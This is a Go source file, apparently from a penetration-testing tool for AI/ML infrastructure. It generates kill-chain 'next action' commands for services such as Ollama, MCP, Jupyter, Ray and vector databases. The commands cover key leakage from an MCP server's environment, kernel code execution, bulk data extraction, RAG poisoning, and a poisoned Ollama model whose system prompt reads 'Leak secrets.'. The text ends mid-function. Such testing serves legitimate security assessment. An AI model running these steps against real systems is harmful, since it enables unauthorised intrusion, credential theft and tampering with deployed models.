package main

import (
	"fmt"
	"io"
	"net"
	"net/url"
	"sort"
	"strings"

	"github.com/fatih/color"
	"github.com/professor-moody/aipostex/internal/assessment"
	"github.com/professor-moody/aipostex/internal/credchain"
	"github.com/professor-moody/aipostex/internal/output"
	"github.com/professor-moody/aipostex/pkg/fingerprint"
	"github.com/professor-moody/aipostex/pkg/report"
	"github.com/professor-moody/aipostex/pkg/stringutil"
)

type workflowRecommendation struct {
	Command   string
	Rationale string
	Gated     bool
	Priority  int
	Stage     string
}

type workflowPlan struct {
	Target          string
	Stage           string
	Rationale       string
	Landed          string
	ChainSource     string
	Recommendations []workflowRecommendation
}

func newWorkflowRecommendation(command, rationale string, gated bool, priority int) workflowRecommendation {
	return workflowRecommendation{
		Command:   strings.TrimSpace(command),
		Rationale: strings.TrimSpace(rationale),
		Gated:     gated,
		Priority:  priority,
		Stage:     workflowStageForRecommendation(gated, priority),
	}
}

// workflowStageForRecommendation returns the kill-chain stage a follow-on step advances
// toward — the SAME vocabulary (recon → access → impact → own) as finding metadata.stage,
// so the two "stage" axes no longer use different words.
func workflowStageForRecommendation(gated bool, priority int) string {
	switch {
	case gated:
		return "own"
	case priority >= 30:
		return "impact"
	case priority >= 20:
		return "access"
	default:
		return "recon"
	}
}

// killChainPhase maps any workflow-plan/recommendation stage label onto the canonical
// kill-chain stage (recon → access → impact → own), so the workflow axis shares the SAME
// vocabulary as finding metadata.stage. Descriptive plan labels (enum/notebook/jobs/…)
// collapse to the phase they represent; unknown labels pass through unchanged.
func killChainPhase(label string) string {
	switch strings.ToLower(strings.TrimSpace(label)) {
	case "recon", "discovery", "enum", "enumeration", "models", "model", "show",
		"notebook", "notebooks", "jobs", "pipelines", "registry", "experiment",
		"collection", "kernel":
		return "recon"
	case "access", "correlation", "auth-sweep", "credential-chain", "credential-pivot",
		"backend-failure-triage":
		return "access"
	case "impact", "proof", "exploitation":
		return "impact"
	case "own", "takeover":
		return "own"
	default:
		return strings.ToLower(strings.TrimSpace(label))
	}
}

func workflowStats(plans []workflowPlan) (targets int, gated int) {
	for _, plan := range plans {
		if len(plan.Recommendations) == 0 {
			continue
		}
		targets++
		for _, rec := range plan.Recommendations {
			if rec.Gated {
				gated++
			}
		}
	}
	return targets, gated
}

// inlineWorkflowStatsFromFindings counts the workflow recommendations embedded in the
// findings' metadata — the exact source rendered as inline "next:" lines. It is used to
// derive the summary counters when there is no aggregate workflow plan set, so the
// "N target(s) with follow-on guidance / N gated action(s)" line can never disagree with
// the recommendations actually printed.
func inlineWorkflowStatsFromFindings(findings []report.Finding) (targets, gated int) {
	for _, f := range findings {
		workflow, ok := f.Metadata["workflow"].(map[string]interface{})
		if !ok {
			continue
		}
		hasCommand := false
		for _, rec := range workflowRecommendationEntries(workflow["recommendations"]) {
			if command, _ := rec["command"].(string); strings.TrimSpace(command) == "" {
				continue
			}
			hasCommand = true
			if g, _ := rec["gated"].(bool); g {
				gated++
			}
		}
		if hasCommand {
			targets++
		}
	}
	return targets, gated
}

// workflowRecommendationEntries normalizes the metadata["workflow"]["recommendations"]
// value (which may deserialize as []map or []interface{}) into a uniform slice.
func workflowRecommendationEntries(raw interface{}) []map[string]interface{} {
	switch v := raw.(type) {
	case []map[string]interface{}:
		return v
	case []interface{}:
		entries := make([]map[string]interface{}, 0, len(v))
		for _, e := range v {
			if rec, ok := e.(map[string]interface{}); ok {
				entries = append(entries, rec)
			}
		}
		return entries
	}
	return nil
}

func sortWorkflowPlans(plans []workflowPlan) {
	sort.Slice(plans, func(i, j int) bool {
		ki := canonicalServiceURL(plans[i].Target)
		kj := canonicalServiceURL(plans[j].Target)
		if ki != kj {
			return ki < kj
		}
		if plans[i].Stage != plans[j].Stage {
			return plans[i].Stage < plans[j].Stage
		}
		return plans[i].Rationale < plans[j].Rationale
	})
}

func normalizeWorkflowPlan(plan workflowPlan) workflowPlan {
	recommendations := append([]workflowRecommendation(nil), plan.Recommendations...)
	sort.SliceStable(recommendations, func(i, j int) bool {
		if recommendations[i].Gated != recommendations[j].Gated {
			return !recommendations[i].Gated
		}
		if recommendations[i].Priority != recommendations[j].Priority {
			return recommendations[i].Priority < recommendations[j].Priority
		}
		return recommendations[i].Command < recommendations[j].Command
	})
	plan.Recommendations = recommendations
	return plan
}

func suppressWorkflowCommands(plan workflowPlan, commands ...string) workflowPlan {
	if len(plan.Recommendations) == 0 || len(commands) == 0 {
		return plan
	}

	suppressed := make(map[string]struct{}, len(commands))
	for _, command := range commands {
		command = strings.TrimSpace(command)
		if command == "" {
			continue
		}
		suppressed[command] = struct{}{}
	}
	if len(suppressed) == 0 {
		return plan
	}

	filtered := make([]workflowRecommendation, 0, len(plan.Recommendations))
	for _, rec := range plan.Recommendations {
		if _, drop := suppressed[strings.TrimSpace(rec.Command)]; drop {
			continue
		}
		filtered = append(filtered, rec)
	}
	plan.Recommendations = filtered
	return plan
}

func attachWorkflowToMetadata(metadata map[string]interface{}, plan workflowPlan) map[string]interface{} {
	if metadata == nil {
		metadata = make(map[string]interface{})
	}
	plan = normalizeWorkflowPlan(plan)
	recommendations := make([]map[string]interface{}, 0, len(plan.Recommendations))
	for _, rec := range plan.Recommendations {
		recommendations = append(recommendations, map[string]interface{}{
			"command":   rec.Command,
			"rationale": rec.Rationale,
			"gated":     rec.Gated,
			"priority":  rec.Priority,
			"stage":     killChainPhase(rec.Stage),
		})
	}
	workflow := map[string]interface{}{
		"stage":           killChainPhase(plan.Stage),
		"rationale":       plan.Rationale,
		"recommendations": recommendations,
	}
	if strings.TrimSpace(plan.Landed) != "" {
		workflow["landed"] = plan.Landed
	}
	if strings.TrimSpace(plan.ChainSource) != "" {
		workflow["chain_source"] = plan.ChainSource
	}
	metadata["workflow"] = workflow
	return metadata
}

func annotateEvidenceMetadata(f *report.Finding, kind string) {
	if f == nil {
		return
	}
	if f.Metadata == nil {
		f.Metadata = make(map[string]interface{})
	}

	preview := strings.TrimSpace(f.Evidence)
	redacted := false
	if existing, ok := f.Metadata["console_evidence"].(string); ok && strings.TrimSpace(existing) != "" {
		preview = strings.TrimSpace(existing)
		redacted = preview != strings.TrimSpace(f.Evidence)
	}
	if preview == "" {
		return
	}

	meta := map[string]interface{}{
		"kind":          safeEvidenceKind(kind),
		"redacted":      redacted,
		"raw_preserved": strings.TrimSpace(f.Evidence) != "",
	}
	// For JSON evidence, do NOT store a bounded one-line preview. Leaving it out makes the
	// console default view fall through to the raw (or redacted console_evidence) value,
	// which writeEvidencePreview pretty-prints via maybeIndentJSON and caps at a few lines —
	// readable structured JSON instead of the old "json keys=… {chunk}" run-on. Non-JSON
	// evidence keeps the bounded single-line preview.
	if summarizeJSONShape(preview) == "" {
		meta["preview"] = stringutil.BoundedPreview(preview, 160)
	}
	f.Metadata["evidence"] = meta
}

func safeEvidenceKind(kind string) string {
	kind = strings.TrimSpace(kind)
	if kind == "" {
		return "text"
	}
	return kind
}

func annotateFindingsForOutput(findings []report.Finding) []report.Finding {
	normalized := append([]report.Finding(nil), findings...)
	for i := range normalized {
		annotateEvidenceMetadata(&normalized[i], inferEvidenceKind(normalized[i]))
		// Guarantee every emitted finding carries stage/landed.
		// Enum/fingerprint/listing paths never set them; default to the honest
		// floor (discovery/reachable) without overriding stronger claims.
		ensureFindingStageLandedDefaults(&normalized[i])
	}
	return normalized
}

func inferEvidenceKind(f report.Finding) string {
	if strings.TrimSpace(f.Evidence) == "" {
		return ""
	}

	if len(f.Metadata) > 0 {
		if action, ok := f.Metadata["action"].(string); ok {
			switch action {
			case "enum":
				return "service-description"
			case "jobs", "experiments":
				return "inventory"
			case "validate-inference", "prompt-extract", "proxy-test", "generate":
				return "model-response"
			case "predict":
				return "service-response"
			case "prompts", "show":
				return "model-metadata"
			case "extract", "search-sensitive", "read-notebook", "exec", "download-artifact", "bulk-download", "download-file", "model-artifacts":
				return "artifact-content"
			case "submit":
				return "job-response"
			case "poison":
				return "probe-response"
			}
		}
	}

	switch f.Source {
	case report.SourceFileDiscovery:
		return "match-preview"
	case report.SourceMCP:
		return "probe-response"
	default:
		return "text"
	}
}

func printWorkflowPlans(w io.Writer, plans []workflowPlan, verbose bool) {
	filtered := make([]workflowPlan, 0, len(plans))
	for _, plan := range plans {
		plan = normalizeWorkflowPlan(plan)
		if len(plan.Recommendations) == 0 {
			continue
		}
		filtered = append(filtered, plan)
	}
	if len(filtered) == 0 {
		return
	}

	sortWorkflowPlans(filtered)

	type targetGroup struct {
		label    string
		commands []string
	}

	readGroups := make([]targetGroup, 0)
	var gatedCommands []string
	seenLabels := make(map[string]struct{})
	seenGated := make(map[string]struct{})

	for _, plan := range filtered {
		label := compactTargetLabel(plan.Target)
		var readCmds []string
		for _, rec := range plan.Recommendations {
			if rec.Gated {
				if _, dup := seenGated[rec.Command]; !dup {
					seenGated[rec.Command] = struct{}{}
					gatedCommands = append(gatedCommands, rec.Command)
				}
			} else {
				readCmds = append(readCmds, rec.Command)
			}
		}
		if len(readCmds) > 0 {
			if _, exists := seenLabels[label]; !exists {
				seenLabels[label] = struct{}{}
				readGroups = append(readGroups, targetGroup{label: label, commands: readCmds})
			} else {
				for i := range readGroups {
					if readGroups[i].label == label {
						readGroups[i].commands = append(readGroups[i].commands, readCmds...)
						break
					}
				}
			}
		}
	}

	// Deduplicate commands within each target group
	for i := range readGroups {
		readGroups[i].commands = uniqueStringsOrdered(readGroups[i].commands)
		readGroups[i].commands = suppressGenericScanWhenTargeted(readGroups[i].commands)
	}

	fmt.Fprintf(w, "\n%s\n", consoleSectionHeader("Next Actions"))
	for _, group := range readGroups {
		fmt.Fprintf(w, "\n  %s\n", group.label)
		for _, plan := range filtered {
			if compactTargetLabel(plan.Target) != group.label || plan.Rationale == "" {
				continue
			}
			if verbose || strings.HasPrefix(plan.Rationale, "[") {
				printWrapped(w, 4, "", plan.Rationale) // rationale is prose — keep wrapping
			}
			break
		}
		for _, cmd := range group.commands {
			// Commands render on one line (never wrapped) so a long command stays
			// copy-complete and a wrapped tail can't be mistaken for a new command.
			fmt.Fprintf(w, "    %s\n", cmd)
		}
	}

	if len(gatedCommands) > 0 {
		fmt.Fprintf(w, "\n  [gated - requires --force-exploit]\n")
		for _, cmd := range gatedCommands {
			fmt.Fprintf(w, "    %s\n", cmd)
		}
	}
	fmt.Fprintln(w)
}

// buildHostNextSteps folds a per-host "start here" map (keyed by the same
// assessment.TargetGroupKey as groupFindingsByHost) for the writer to co-locate with
// each host's findings. For each port it prefers the command for the service the
// findings actually identify (so an ambiguously-fingerprinted Ray port suggests `ray`,
// not a phantom `ollama` co-match), and only falls back to the fingerprint plan when no
// finding pins a service or that service has no module commands.
func buildHostNextSteps(plans []workflowPlan, findings []report.Finding) map[string]output.HostNextSteps {
	filtered := make([]workflowPlan, 0, len(plans))
	for _, plan := range plans {
		plan = normalizeWorkflowPlan(plan)
		if len(plan.Recommendations) == 0 {
			continue
		}
		filtered = append(filtered, plan)
	}
	if len(filtered) == 0 {
		return nil
	}
	sortWorkflowPlans(filtered)

	// Per port (host:port label), the service of its highest-severity vuln finding —
	// the ground truth for what the port actually is.
	portService := make(map[string]string)
	portServiceSev := make(map[string]int)
	for _, f := range findings {
		if f.Source != report.SourceVulnCheck {
			continue
		}
		svc := findingService(f)
		if svc == "" {
			continue
		}
		label := compactTargetLabel(f.Target)
		rank := severityRankForSummary(f.Severity)
		if cur, ok := portServiceSev[label]; !ok || rank < cur {
			portServiceSev[label] = rank
			portService[label] = svc
		}
	}

	// Collect read (non-gated) commands per port from the fingerprint plans (fallback),
	// preserving sorted plan order and the original target URL.
	type svcGroup struct {
		target   string
		commands []string
	}
	order := make([]string, 0)
	groups := make(map[string]*svcGroup)
	for _, plan := range filtered {
		label := compactTargetLabel(plan.Target)
		g, ok := groups[label]
		if !ok {
			g = &svcGroup{target: plan.Target}
			groups[label] = g
			order = append(order, label)
		}
		for _, rec := range plan.Recommendations {
			if !rec.Gated {
				g.commands = append(g.commands, rec.Command)
			}
		}
	}

	result := make(map[string]output.HostNextSteps)
	for _, label := range order {
		g := groups[label]
		var cmds []string
		// Findings-driven: synthesize the read commands for the service the findings
		// identified on this port.
		if svc := portService[label]; svc != "" {
			synth := buildScanNetworkWorkflowPlanInner(fingerprint.Result{Service: svc, URL: g.target}, canonicalServiceURL(g.target))
			for _, rec := range synth.Recommendations {
				if !rec.Gated {
					cmds = append(cmds, rec.Command)
				}
			}
		}
		// Fall back to the fingerprint-plan commands when findings don't pin a service
		// or that service has no module commands (e.g. langserve/streamlit/python).
		if len(cmds) == 0 {
			cmds = g.commands
		}
		cmds = suppressGenericScanWhenTargeted(uniqueStringsOrdered(cmds))
		if len(cmds) == 0 {
			continue
		}
		// Prefer the module command (e.g. `ray jobs`) as the headline over a generic
		// `scan targets`, which is a weaker "start here".
		headline := cmds[0]
		for _, c := range cmds {
			if !isScanTargetsCommand(c) {
				headline = c
				break
			}
		}
		host := assessment.TargetGroupKey(report.SourceFingerprint, g.target)
		hs := result[host]
		hs.Commands = append(hs.Commands, headline)
		hs.MoreCount += len(cmds) - 1
		result[host] = hs
	}
	if len(result) == 0 {
		return nil
	}
	return result
}

// applyHostNextSteps pushes the folded per-host "start here" commands into a grouped
// console writer for the non-verbose view. No-op under -v (the full catalog prints
// instead) and for writers that don't support it (json/jsonl/etc.).
func applyHostNextSteps(writer output.Writer, plans []workflowPlan, findings []report.Finding) {
	if cfg.Verbose {
		return
	}
	if setter, ok := writer.(interface {
		SetHostNextSteps(map[string]output.HostNextSteps)
	}); ok {
		setter.SetHostNextSteps(buildHostNextSteps(plans, findings))
	}
}

// printGatedSummary prints the one-line gated-actions count for the non-verbose view.
// The full gated command list prints under -v via printWorkflowPlans.
func printGatedSummary(w io.Writer, plans []workflowPlan) {
	seen := make(map[string]struct{})
	for _, plan := range plans {
		plan = normalizeWorkflowPlan(plan)
		for _, rec := range plan.Recommendations {
			if rec.Gated {
				seen[rec.Command] = struct{}{}
			}
		}
	}
	if len(seen) == 0 {
		return
	}
	fmt.Fprintf(w, "\n  %s\n", color.HiBlackString("⚠ %d gated (--force-exploit) action(s) — -v to list", len(seen)))
}

func suppressGenericScanWhenTargeted(commands []string) []string {
	if len(commands) == 0 {
		return commands
	}
	targeted := make(map[string]struct{})
	for _, command := range commands {
		if target, ok := scanTargetFromCommand(command, true); ok {
			targeted[target] = struct{}{}
		}
	}
	if len(targeted) == 0 {
		return commands
	}
	filtered := make([]string, 0, len(commands))
	for _, command := range commands {
		if target, ok := scanTargetFromCommand(command, false); ok {
			if _, hasTargeted := targeted[target]; hasTargeted {
				continue
			}
		}
		filtered = append(filtered, command)
	}
	return filtered
}

// isScanTargetsCommand reports whether a command is a generic `aipostex scan targets`
// invocation (as opposed to a module command like `aipostex ollama … enum`).
func isScanTargetsCommand(command string) bool {
	fields := strings.Fields(command)
	return len(fields) >= 3 && fields[0] == "aipostex" && fields[1] == "scan" && fields[2] == "targets"
}

func scanTargetFromCommand(command string, requireTags bool) (string, bool) {
	fields := strings.Fields(command)
	if len(fields) < 4 || fields[0] != "aipostex" || fields[1] != "scan" || fields[2] != "targets" {
		return "", false
	}
	var target string
	hasTags := false
	for i := 3; i < len(fields); i++ {
		switch fields[i] {
		case "--target":
			if i+1 < len(fields) {
				target = canonicalServiceURL(fields[i+1])
				i++
			}
		case "--tags":
			hasTags = true
			i++
		}
	}
	if target == "" || hasTags != requireTags {
		return "", false
	}
	return target, true
}

func compactTargetLabel(target string) string {
	target = canonicalServiceURL(target)
	parsed, err := url.Parse(target)
	if err != nil {
		return target
	}
	host := parsed.Host
	if host == "" {
		return target
	}
	return host
}

func buildScanNetworkWorkflowPlan(result fingerprint.Result) workflowPlan {
	target := canonicalServiceURL(result.URL)
	plan := buildScanNetworkWorkflowPlanInner(result, target)
	switch result.MatchKind {
	case fingerprint.MatchKindSuspected, fingerprint.MatchKindAmbiguous:
		plan.Landed = ""
		plan.Rationale = lowConfidenceWorkflowPrefix(result) + " " + plan.Rationale
		plan.Recommendations = downgradeWorkflowRecommendations(plan.Recommendations, result)
		scanCmd := formatCommandExample("scan targets --target " + target)
		plan.Recommendations = append(
			[]workflowRecommendation{newWorkflowRecommendation(scanCmd, "Verify the surface with broad template coverage before trusting the fingerprint.", false, 5)},
			plan.Recommendations...,
		)
	case fingerprint.MatchKindConfirmed, "":
		tags := strings.Join(serviceToTags(result.Service), ",")
		if tags != "" {
			scanCmd := formatCommandExample("scan targets --target " + target + " --tags " + tags)
			plan.Recommendations = append(
				[]workflowRecommendation{newWorkflowRecommendation(scanCmd, "Run targeted vulnerability templates.", false, 5)},
				plan.Recommendations...,
			)
		}
	}
	if result.ProxyLikely && result.MatchKind == fingerprint.MatchKindConfirmed {
		plan.Rationale = "[Reverse proxy likely] " + plan.Rationale
		scanCmd := formatCommandExample("scan targets --target " + target)
		plan.Recommendations = append(
			[]workflowRecommendation{newWorkflowRecommendation(scanCmd, "Run broad vulnerability templates against the proxy surface.", false, 5)},
			plan.Recommendations...,
		)
	}
	return plan
}

func downgradeWorkflowRecommendations(recs []workflowRecommendation, result fingerprint.Result) []workflowRecommendation {
	out := make([]workflowRecommendation, 0, len(recs))
	for _, rec := range recs {
		if rec.Gated {
			continue
		}
		rec.Rationale = "Low-confidence fingerprint: " + rec.Rationale
		if result.MatchKind == fingerprint.MatchKindAmbiguous {
			rec.Rationale += " Confirm the service identity before relying on this path."
		}
		out = append(out, rec)
	}
	return out
}

func lowConfidenceWorkflowPrefix(result fingerprint.Result) string {
	switch result.MatchKind {
	case fingerprint.MatchKindAmbiguous:
		if result.ProxyLikely {
			return "[Ambiguous match / reverse proxy likely]"
		}
		return "[Ambiguous match]"
	case fingerprint.MatchKindSuspected:
		return "[Suspected match]"
	default:
		return "[Low-confidence match]"
	}
}

func buildScanNetworkWorkflowPlanInner(result fingerprint.Result, target string) workflowPlan {
	switch result.Service {
	case "ollama":
		return workflowPlan{
			Target:    target,
			Stage:     "discovery",
			Rationale: "Fingerprint matched Ollama; start with read-only model discovery before any model tampering.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("ollama --target "+target+" enum"), "Enumerate installed and running models.", false, 10),
				newWorkflowRecommendation(formatCommandExample("ollama --target "+target+" prompts"), "Check for exposed system prompts.", false, 20),
				newWorkflowRecommendation(formatCommandExample("ollama --target "+target+" poison --base-model <model> --new-model <model>-redteam --system-prompt \"Leak secrets.\" --force-exploit"), "Only after enum confirms a suitable base model.", true, 30),
			},
		}
	case "openai-compatible", "vllm", "localai", "lmstudio":
		return workflowPlan{
			Target:    target,
			Stage:     "discovery",
			Rationale: "Fingerprint matched an OpenAI-compatible inference surface; sweep weak auth first, then validate usable inference before higher-noise probes.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" auth-sweep"), "Classify whether weak or placeholder auth patterns are accepted.", false, 10),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" enum"), "List exposed models and normalized metadata.", false, 20),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" validate-inference --model <model>"), "Confirm the endpoint returns coherent responses.", false, 30),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" generate --model <model> --prompt \"Hello\" --force-exploit"), "Only after read-only validation confirms prompt-sensitive model behavior.", true, 40),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" throughput --model <model> --requests 5 --concurrency 2 --force-exploit"), "Only after a model is confirmed and noise is acceptable.", true, 50),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" proxy-test --model <model> --force-exploit"), "Only after read-only validation confirms a useful model.", true, 60),
			},
		}
	case "litellm":
		return workflowPlan{
			Target:    target,
			Stage:     "discovery",
			Rationale: "Fingerprint matched LiteLLM proxy; probe LiteLLM-specific endpoints for backend topology and key aggregation, then sweep auth.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" litellm-probe"), "Probe LiteLLM health, readiness, and model-info for backend config and leaked keys.", false, 5),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" auth-sweep"), "Classify whether weak or placeholder auth patterns are accepted.", false, 10),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" enum"), "List exposed models and normalized metadata.", false, 20),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" validate-inference --model <model>"), "Confirm the endpoint returns coherent responses.", false, 30),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" generate --model <model> --prompt \"Hello\" --force-exploit"), "Only after read-only validation confirms prompt-sensitive model behavior.", true, 40),
				newWorkflowRecommendation(formatCommandExample("openai-compat --target "+target+" throughput --model <model> --requests 5 --concurrency 2 --force-exploit"), "Only after a model is confirmed and noise is acceptable.", true, 50),
			},
		}
	case "mcp-sse":
		recommendations := []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mcp --target "+target+" enum"), "Enumerate tools, prompts, and resources before active probing.", false, 10),
			newWorkflowRecommendation(formatCommandExample("mcp --target "+target+" env-extract"), "Leak the server's environment (API keys, tokens) via an exposed tool.", false, 20),
			newWorkflowRecommendation(formatCommandExample("scan targets --target "+target+" --tags mcp --mode full"), "Fire the MCP command-injection / path-traversal / SSRF templates through the real MCP handshake.", true, 30),
		}
		return workflowPlan{
			Target:          target,
			Stage:           "discovery",
			Landed:          "reachable",
			ChainSource:     "discover network",
			Rationale:       "Fingerprint matched MCP HTTP/SSE exposure; enumerate capabilities before any active poison mode.",
			Recommendations: recommendations,
		}
	case "mcp-inspector", "mcpjam-inspector":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "Fingerprint matched an MCP inspector/debug surface; verify inspector API exposure with templates before assuming the port speaks MCP transport.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("scan targets --target "+target+" --tags inspector,mcp"), "Run inspector-specific template coverage without assuming MCP protocol compatibility.", false, 10),
			},
		}
	case "jupyter":
		return workflowPlan{
			Target:    target,
			Stage:     "discovery",
			Rationale: "Jupyter exposure should progress through metadata, notebook, and kernel review before code execution.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("jupyter --target "+target+" enum"), "Gather server, kernel, and notebook inventory.", false, 10),
				newWorkflowRecommendation(formatCommandExample("jupyter --target "+target+" notebooks"), "List readable notebook paths for follow-on reads.", false, 20),
				newWorkflowRecommendation(formatCommandExample("jupyter --target "+target+" kernels"), "Identify active kernels for potential execution paths.", false, 30),
				newWorkflowRecommendation(formatCommandExample("jupyter --target "+target+" exec --kernel <kernel-id> --code \"print('hi')\" --force-exploit"), "Only after a valid kernel is confirmed and execution is in scope.", true, 40),
			},
		}
	case "chromadb", "weaviate", "qdrant", "milvus":
		return workflowPlan{
			Target:    target,
			Stage:     "discovery",
			Rationale: "Vector database exposure is best followed by read-only collection discovery before bulk extraction.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("vectordb --target "+target+" --type "+result.Service+" enum"), "List collections and record counts first.", false, 10),
				newWorkflowRecommendation(formatCommandExample("vectordb --target "+target+" --type "+result.Service+" extract --collection <collection>"), "Use a confirmed collection name for extraction.", false, 20),
				newWorkflowRecommendation(formatCommandExample("vectordb --target "+target+" --type "+result.Service+" search-sensitive --collection <collection>"), "Search confirmed collections for sensitive content.", false, 30),
				newWorkflowRecommendation(formatCommandExample("vectordb --target "+target+" --type "+result.Service+" rag-verify --collection <collection> --llm-target <llm-url> --force-exploit"), "Prove RAG poisoning: inject a canary and verify retrieval through a downstream LLM.", true, 40),
			},
		}
	case "ray":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "Ray dashboard exposure should progress through metadata, jobs, and logs before takeover-oriented proof actions.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("ray --target "+target+" enum"), "Enumerate dashboard metadata and jobs API reachability.", false, 10),
				newWorkflowRecommendation(formatCommandExample("ray --target "+target+" jobs"), "List visible jobs and identifiers.", false, 20),
				newWorkflowRecommendation(formatCommandExample("ray --target "+target+" job-logs --job-id <job-id>"), "Pull bounded job detail before active submission.", false, 30),
				newWorkflowRecommendation(formatCommandExample("ray --target "+target+" submit --payload-preset env-disclosure --force-exploit"), "Only after confirming jobs API reachability and engagement approval.", true, 40),
				newWorkflowRecommendation(formatCommandExample("ray --target "+target+" runtime-env --job-id <job-id> --force-exploit"), "Only after a submitted or discovered job suggests runtime takeover is viable.", true, 50),
			},
		}
	case "mlflow":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "MLflow should move from tracking metadata into registry, runs, and bounded artifact/model reads.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" enum"), "Enumerate tracking metadata, visible experiments, and run inventory.", false, 10),
				newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" registry"), "Check whether the model registry API is exposed.", false, 20),
				newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-versions --model <registered-model>"), "Correlate a registered model with concrete versions and runs.", false, 30),
				newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" model-artifacts --model <registered-model> --version <version>"), "Use a discovered model/version pair for bounded model material reads.", false, 40),
				newWorkflowRecommendation(formatCommandExample("mlflow --target "+target+" tamper-proof --force-exploit"), "Prove write access by creating a benign tracked experiment/run (integrity impact).", true, 50),
			},
		}
	case "gradio":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "Gradio exposure should start with config and endpoint enum, then bounded predict, file-chain, and serve checks.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("gradio --target "+target+" enum"), "Enumerate config and callable endpoints.", false, 10),
				newWorkflowRecommendation(formatCommandExample("gradio --target "+target+" predict --api-name <api-name> --input-json '[\"hello\"]'"), "Use a discovered API route when available.", false, 20),
				newWorkflowRecommendation(formatCommandExample("gradio --target "+target+" file-chain --file <file-ref>"), "Drive a discovered file reference through the download/read chain.", false, 30),
				newWorkflowRecommendation(formatCommandExample("gradio --target "+target+" serve-probe --file <file-ref> --force-exploit"), "Only after predict or upload returns a concrete file handle.", true, 40),
			},
		}
	case "bentoml":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "BentoML service should progress through route discovery and metrics before active prediction testing.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("bentoml --target "+target+" enum"), "Enumerate service metadata, health, and API routes.", false, 10),
				newWorkflowRecommendation(formatCommandExample("bentoml --target "+target+" routes"), "Parse OpenAPI spec for all prediction endpoints.", false, 20),
				newWorkflowRecommendation(formatCommandExample("bentoml --target "+target+" metrics"), "Check for exposed Prometheus metrics.", false, 30),
				newWorkflowRecommendation(formatCommandExample("bentoml --target "+target+" predict --endpoint /predict --payload '{\"input\":\"test\"}' --force-exploit"), "Only after routes are confirmed.", true, 40),
			},
		}
	case "wandb":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "Weights & Biases servers expose project and run APIs; validate unauthenticated access and config leakage with templates before deeper enumeration.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("scan targets --target "+target+" --tags wandb --mode detect"), "Run bundled W&B detection templates against this URL.", false, 10),
				newWorkflowRecommendation(formatCommandExample("discover files --path <training-repo>"), "Hunt for wandb/settings and API keys on adjacent developer workstations.", false, 20),
			},
		}
	case "triton":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "Triton should progress through server and model enumeration, SHM probing, then inference and model lifecycle testing.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("triton --target "+target+" enum"), "Enumerate server metadata, health, and extensions.", false, 10),
				newWorkflowRecommendation(formatCommandExample("triton --target "+target+" models"), "List all loaded models with metadata.", false, 20),
				newWorkflowRecommendation(formatCommandExample("triton --target "+target+" shm-probe"), "Probe for shared memory regions (IPC vuln chain).", false, 30),
				newWorkflowRecommendation(formatCommandExample("triton --target "+target+" infer --model <model> --payload '{\"inputs\":[]}' --force-exploit"), "Only after a model is confirmed.", true, 40),
				newWorkflowRecommendation(formatCommandExample("triton --target "+target+" model-load --model <model> --force-exploit"), "Only after confirming repository API access.", true, 50),
			},
		}
	case "tfserving":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "TF Serving exposes models via REST; enumerate before probing individual model endpoints for inference or metadata leakage.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("tfserving --target "+target+" enum"), "Enumerate server reachability and discover served model names.", false, 10),
				newWorkflowRecommendation(formatCommandExample("tfserving --target "+target+" models"), "List all models and their version/state information.", false, 20),
				newWorkflowRecommendation(formatCommandExample("tfserving --target "+target+" metadata --model <model>"), "Pull signature and tensor shape metadata for a discovered model.", false, 30),
				newWorkflowRecommendation(formatCommandExample("tfserving --target "+target+" metrics"), "Scrape Prometheus metrics endpoint for model and latency data.", false, 35),
				newWorkflowRecommendation(formatCommandExample("tfserving --target "+target+" predict --model <model> --payload '{\"instances\":[[1,2,3]]}' --force-exploit"), "Only after a model and its input shape are confirmed.", true, 40),
			},
		}
	case "torchserve":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
